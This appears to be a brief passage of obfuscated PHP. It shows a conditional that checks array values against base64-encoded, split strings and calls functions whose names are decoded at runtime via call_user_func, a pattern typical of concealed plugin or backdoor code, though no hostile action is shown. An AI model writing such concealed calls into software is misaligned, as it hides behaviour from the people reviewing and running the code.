...
if (!empty($static_data[ab_____(base64_decode('YmNgYHZ1YG54amBgdHVidXZ0'))]) and $static_data[ab_____(base64_decode('YmNgYHZ1YG54amBgdHVidXZ0'))] == ab_____(base64_decode('Wg==')) and call_user_func(ab_____(base64_decode('an'.'RgYn'.'NzY'.'no=')),call_user_func(ab_____(base64_decode('VXp'.'oaV1'.'CQ0JO'.'Ym9i'.'aGZzO'.'ztk'.'aWBi')),true)) ){
